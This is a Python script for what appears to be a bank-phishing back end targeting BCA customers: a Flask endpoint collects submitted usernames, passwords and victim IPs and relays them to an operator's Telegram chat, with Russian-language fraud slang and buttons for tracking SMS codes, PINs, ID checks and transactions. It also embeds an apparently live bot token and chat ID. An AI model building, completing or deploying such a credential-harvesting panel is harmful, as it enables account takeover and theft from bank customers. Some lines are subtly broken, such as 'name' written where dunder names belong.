import logging
import datetime
import hashlib
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import threading
import asyncio

BOT_TOKEN = "8569845577:AAFmIoKQue0RE6lwnMIswGi1MjS8jh7KR2I"
ADMIN_CHAT_ID = "6910943310"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(name)

logs = {}

def generate_log_id(username, ip):
    raw = f"{username}_{ip}_{datetime.datetime.now().timestamp()}"
    return "LOG_" + hashlib.md5(raw.encode()).hexdigest()[:16].upper()

async def send_log_to_admin(application, log_id, username, password, ip):
    log_data = {
        "username": username,
        "password": password,
        "ip": ip,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": {"sms": None, "pin": None, "transaction": None, "id_confirm": None, "login_error": False}
    }
    logs[log_id] = log_data

    text = (
        f"Hank Bank | Bot\n"
        f"Вы успешно взяли IP на вбив ... Оффе...\n\n"
        f"Оффер: BCA Individual\n\n"
        f"Username: {username}\n"
        f"Password: {password}\n\n"
        f"IP: {ip}\n"
        f"Время: {log_data['timestamp']}\n"
        f"Log ID: {log_id}\n"
        f"IP закреплен за: @canaodm\n"
        f"Это новый лог от этого IP\n"
    )

    keyboard = [
        [InlineKeyboardButton("✔ SMS", callback_data=f"sms_success_{log_id}"),
         InlineKeyboardButton("✘ SMS", callback_data=f"sms_error_{log_id}")],
        [InlineKeyboardButton("✔ PIN", callback_data=f"pin_success_{log_id}"),
         InlineKeyboardButton("✘ PIN", callback_data=f"pin_error_{log_id}")],
        [InlineKeyboardButton("✔ Transaction", callback_data=f"transaction_success_{log_id}"),
         InlineKeyboardButton("✘ Transaction", callback_data=f"transaction_error_{log_id}")],
        [InlineKeyboardButton("✔ ID Confirm", callback_data=f"idconfirm_success_{log_id}"),
         InlineKeyboardButton("✘ ID Error", callback_data=f"idconfirm_error_{log_id}")],
        [InlineKeyboardButton("✘ Login Error", callback_data=f"login_error_{log_id}")],
        [InlineKeyboardButton("Check Online", callback_data=f"checkonline_{log_id}"),
         InlineKeyboardButton("Отказаться от IP", callback_data=f"reject_{log_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await application.bot.send_message(chat_id=ADMIN_CHAT_ID, text=text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    log_id = data.split("_")[-1]
    if log_id not in logs:
        await query.edit_message_text("Лог не найден")
        return
    log = logs[log_id]
    await query.edit_message_text(f"Статус обновлён. Текущие статусы: {log['status']}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Бот для сбора данных BCA запущен.")

app = Flask(name)
CORS(app)

@app.route('/post', methods=['POST'])
def post_data():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    ip = request.remote_addr
    log_id = generate_log_id(username, ip)
    asyncio.run_coroutine_threadsafe(
        send_log_to_admin(application, log_id, username, password, ip),
        application.loop
    )
    return jsonify({"status": "ok", "log_id": log_id})

if name == "main":
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    def run_bot():
        application.run_polling()
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()

    app.run(host="0.0.0.0", port=5000, debug=False)